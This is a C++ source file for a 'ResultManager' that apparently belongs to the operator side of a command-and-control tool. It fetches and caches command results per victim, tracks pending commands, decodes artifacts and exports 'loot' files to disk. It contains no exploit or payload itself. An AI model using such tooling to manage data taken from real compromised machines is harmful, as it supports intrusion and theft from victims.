#include "ResultManager.hpp"

#include "CommandDAO.hpp"
#include "ExfilEnvelope.hpp"

#include <algorithm>
#include <fstream>

ResultManager& ResultManager::instance() {
    static ResultManager instance;
    return instance;
}

bool ResultManager::refresh(RestGateway& gateway) {
    const auto fetched = gateway.fetch_results();
    if (!fetched) {
        return false;
    }

    std::lock_guard lock(mtx_);
    for (const auto& result : fetched.value()) {
        cache_[result.command_uid] = result;
    }
    return true;
}

bool ResultManager::refresh_for_victim(RestGateway& gateway, const UUID& victim_uid) {
    const auto fetched = gateway.fetch_results_for_victim(victim_uid);
    if (!fetched) {
        return false;
    }

    std::lock_guard lock(mtx_);
    for (const auto& result : fetched.value()) {
        cache_[result.command_uid] = result;
    }
    return true;
}

void ResultManager::poll_pending(RestGateway& gateway, CommandManager& commands) {
    commands.poll_timeouts(get_unix_time());

    if (!refresh(gateway)) {
        return;
    }

    for (const auto& pending : commands.pending()) {
        if (pending.state != PendingCommand::State::Posted) {
            continue;
        }
        if (get(pending.uid)) {
            commands.mark_completed(pending.uid);
        }
    }
}

void ResultManager::add_local_artifact(ResultDAO result, std::string command_text, std::string source) {
    std::lock_guard lock(mtx_);
    LocalArtifact artifact;
    artifact.result = std::move(result);
    artifact.command_text = std::move(command_text);
    artifact.source = std::move(source);
    const UUID uid = artifact.result.command_uid;
    command_texts_[uid] = artifact.command_text;
    cache_[uid] = artifact.result;
    local_only_[uid] = std::move(artifact);
}

void ResultManager::track_command_text(const UUID& command_uid, const std::string& command_text) {
    std::lock_guard lock(mtx_);
    command_texts_[command_uid] = command_text;
}

std::vector<ResultDAO> ResultManager::results() const {
    std::lock_guard lock(mtx_);
    std::vector<ResultDAO> out;
    out.reserve(cache_.size());
    for (const auto& [uid, result] : cache_) {
        out.push_back(result);
    }

    std::ranges::sort(out, [](const ResultDAO& a, const ResultDAO& b) {
        return a.created_at > b.created_at;
    });

    if (out.size() > 500) {
        out.resize(500);
    }
    return out;
}

std::optional<ResultDAO> ResultManager::get(const UUID& command_uid) const {
    std::lock_guard lock(mtx_);
    if (auto it = cache_.find(command_uid); it != cache_.end()) {
        return it->second;
    }
    return std::nullopt;
}

DecodedArtifact ResultManager::decode(const UUID& command_uid, const std::string& command_text) const {
    std::lock_guard lock(mtx_);
    auto it = cache_.find(command_uid);
    if (it == cache_.end()) {
        DecodedArtifact artifact;
        artifact.success = false;
        artifact.error = "Result not found";
        return artifact;
    }

    std::string resolved_command = command_text;
    if (resolved_command.empty()) {
        if (auto text_it = command_texts_.find(command_uid); text_it != command_texts_.end()) {
            resolved_command = text_it->second;
        } else if (auto local_it = local_only_.find(command_uid); local_it != local_only_.end()) {
            resolved_command = local_it->second.command_text;
        }
    }

    return decoders_.decode(it->second, resolved_command);
}

bool ResultManager::export_artifact(
    const UUID& command_uid,
    const std::string& path,
    const std::string& command_text) const {
    const auto artifact = decode(command_uid, command_text);
    if (!artifact.success) {
        return false;
    }

    if (!artifact.loot_files.empty()) {
        const auto base = std::filesystem::path(path);
        std::error_code ec;
        std::filesystem::create_directories(base, ec);
        for (const auto& entry : artifact.loot_files) {
            const auto filename = std::filesystem::path(entry.path).filename().string();
            std::ofstream out(base / filename, std::ios::binary);
            if (!out) {
                return false;
            }
            out.write(reinterpret_cast<const char*>(entry.data.data()),
                static_cast<std::streamsize>(entry.data.size()));
        }
        return true;
    }

    if (!artifact.bytes.empty()) {
        std::ofstream out(path, std::ios::binary);
        if (!out) {
            return false;
        }
        out.write(reinterpret_cast<const char*>(artifact.bytes.data()),
            static_cast<std::streamsize>(artifact.bytes.size()));
        return true;
    }

    std::ofstream out(path);
    if (!out) {
        return false;
    }
    out << artifact.text;
    return true;
}
